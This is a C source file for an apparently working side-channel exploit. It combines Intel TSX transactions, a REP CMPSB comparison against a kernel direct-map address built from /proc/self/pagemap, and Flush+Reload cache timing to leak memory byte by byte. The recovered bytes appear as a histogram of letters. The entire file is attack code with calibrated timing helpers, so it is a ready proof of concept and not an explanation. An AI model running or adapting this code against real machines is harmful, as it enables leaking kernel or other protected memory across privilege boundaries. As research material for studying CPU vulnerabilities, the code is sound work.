#define _GNU_SOURCE 1

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/utsname.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <memory.h>
#include <sys/mman.h>
#include <cpuid.h>

#ifndef _CACHEUTILS_H_
#define _CACHEUTILS_H_

#include <assert.h>
#include <unistd.h>
#include <stdio.h>
#include <stdint.h>

size_t CACHE_MISS = 150;

#define USE_RDTSC_BEGIN_END 0

#define USE_RDTSCP 1
uint64_t rdtsc()
{
    uint64_t a, d;
    asm volatile("mfence");
#if USE_RDTSCP
    asm volatile("rdtscp"
                 : "=a"(a), "=d"(d)::"rcx");
#else
    asm volatile("rdtsc"
                 : "=a"(a), "=d"(d));
#endif
    a = (d << 32) | a;
    asm volatile("mfence");
    return a;
}

void flush(void *p) { asm volatile("clflush 0(%0)\n" ::"c"(p) : "rax"); }
void maccess(void *p) { asm volatile("movq (%0), %%rax\n" ::"c"(p) : "rax"); }
void mfence() { asm volatile("mfence"); }

unsigned int xbegin()
{
    unsigned status;
    asm volatile(".byte 0xc7,0xf8,0x00,0x00,0x00,0x00"
                 : "=a"(status)
                 : "a"(-1UL)
                 : "memory");
    return status;
}

void xend()
{
    asm volatile(".byte 0x0f\n\t .byte 0x01\n\t .byte 0xd5" ::
                     : "memory");
}

int has_tsx()
{
    if (__get_cpuid_max(0, NULL) >= 7)
    {
        unsigned a, b, c, d;
        __cpuid_count(7, 0, a, b, c, d);
        return (b & (1 << 11)) ? 1 : 0;
    }
    else
    {
        return 0;
    }
}

int flush_reload(void *ptr)
{
    uint64_t start = 0, end = 0;

#if USE_RDTSC_BEGIN_END
    start = rdtsc_begin();
#else
    start = rdtsc();
#endif
    maccess(ptr);
#if USE_RDTSC_BEGIN_END
    end = rdtsc_end();
#else
    end = rdtsc();
#endif

    mfence();

    flush(ptr);

    if (end - start < CACHE_MISS)
    {
        return 1;
    }
    return 0;
}

int flush_reload_t(void *ptr)
{
    uint64_t start = 0, end = 0;

#if USE_RDTSC_BEGIN_END
    start = rdtsc_begin();
#else
    start = rdtsc();
#endif
    maccess(ptr);
#if USE_RDTSC_BEGIN_END
    end = rdtsc_end();
#else
    end = rdtsc();
#endif

    mfence();

    flush(ptr);

    return (int)(end - start);
}

int reload_t(void *ptr)
{
    uint64_t start = 0, end = 0;

#if USE_RDTSC_BEGIN_END
    start = rdtsc_begin();
#else
    start = rdtsc();
#endif
    maccess(ptr);
#if USE_RDTSC_BEGIN_END
    end = rdtsc_end();
#else
    end = rdtsc();
#endif

    mfence();

    return (int)(end - start);
}

size_t detect_flush_reload_threshold()
{
    size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
    size_t dummy[16];
    size_t *ptr = dummy + 8;

    maccess(ptr);
    for (i = 0; i < count; i++)
    {
        reload_time += reload_t(ptr);
    }
    for (i = 0; i < count; i++)
    {
        flush_reload_time += flush_reload_t(ptr);
    }
    reload_time /= count;
    flush_reload_time /= count;

    return (flush_reload_time + reload_time * 2) / 3;
}

static jmp_buf trycatch_buf;

void unblock_signal(int signum __attribute__((__unused__)))
{
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, signum);
    sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}

void trycatch_segfault_handler(int signum)
{
    (void)signum;
    unblock_signal(SIGSEGV);
    unblock_signal(SIGFPE);
    longjmp(trycatch_buf, 1);
}

#endif

#define FROM 'A'
#define TO 'Z'
#define PAGE_SIZE 4096
#define TEST_NUM 1000

char __attribute__((aligned(4096))) mem[256 * 4096];
char __attribute__((aligned(4096))) mapping[4096];
size_t hist[256];

void *page_pointer_malloc_unaligned;
void *page_pointer_malloc;
unsigned char *basic_addr;

size_t get_physical_address(size_t vaddr)
{
    int fd = open("/proc/self/pagemap", O_RDONLY);
    uint64_t virtual_addr = (uint64_t)vaddr;
    size_t value = 0;
    off_t offset = (virtual_addr / 4096) * sizeof(value);
    int got = pread(fd, &value, sizeof(value), offset);
    if (got != sizeof(value))
    {
        return 0;
    }
    close(fd);
    return (value << 12) | ((size_t)vaddr & 0xFFFULL);
}

void recover(int);

int main(int argc, char *argv[])
{
    if (!has_tsx())
    {
        printf("[!] Requires a CPU with Intel TSX support!\n");
    }

    /* Initialize and flush LUT */
    memset(mem, 0, sizeof(mem));

    for (size_t i = 0; i < 256; i++)
    {
        flush(mem + i * 4096);
    }

    int cmp_str, i;
    page_pointer_malloc_unaligned = malloc(PAGE_SIZE * 3);
    memset(page_pointer_malloc_unaligned, PAGE_SIZE * 3, 1);
    page_pointer_malloc = (void *)(((uintptr_t)page_pointer_malloc_unaligned + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1));
    basic_addr = (unsigned char *)page_pointer_malloc + PAGE_SIZE;
    printf("%p %p %p\n", page_pointer_malloc_unaligned, page_pointer_malloc, basic_addr);
    signal(SIGSEGV, trycatch_segfault_handler);

    /* Initialize mapping */
    memset(mapping, 0, 4096);
    size_t paddr = get_physical_address((size_t)mapping);
    if (!paddr)
    {
        printf("[!] Could not get physical address! Did you start as root?\n");
        exit(1);
    }
    printf("Physical address: %lx\n", paddr);
    char *target = (char *)(0xffff888000000000 + paddr);

    // Calculate Flush+Reload threshold
    CACHE_MISS = detect_flush_reload_threshold();
    fprintf(stderr, "[+] Flush+Reload Threshold: %u\n", (unsigned int)CACHE_MISS);

    while (true)
    {

        for (cmp_str = 'A'; cmp_str <= 'Z'; cmp_str++)
        {
            *(basic_addr - 1) = cmp_str;
            for (i = 0; i < TEST_NUM; i++)
            {
                flush(basic_addr);
                /* Flush mapping */
                flush(mapping);
                flush(mapping);
                flush(mapping);

                /* Put target */
                /* Begin transaction and recover value */
                if (xbegin() == (~0u))
                {
                    asm volatile(
                        ""
                        :
                        : "S"(target),
                          "D"(basic_addr - 1)
                        :);
                    asm volatile("REP CMPSB\n\t");
                    xend();
                }
            }
            recover(cmp_str);
        }
    }

    return 0;
}

void recover(int hit)
{

    /* Recover value from cache and update histogram */
    bool update = false;

    if (flush_reload(basic_addr))
    {
        hist[hit]++;
        update = true;
    }

    /* Redraw histogram on update */
    if (update == true)
    {
#ifdef _WIN32
        system("cls");
#else
        printf("\x1b[2J");
#endif

        int max = 1;

        for (int i = FROM; i <= TO; i++)
        {
            if (hist[i] > max)
            {
                max = hist[i];
            }
        }

        for (int i = FROM; i <= TO; i++)
        {
            printf("%c: (%4u) ", i, (unsigned int)hist[i]);
            for (int j = 0; j < hist[i] * 60 / max; j++)
            {
                printf("#");
            }
            printf("\n");
        }

        fflush(stdout);
    }
}
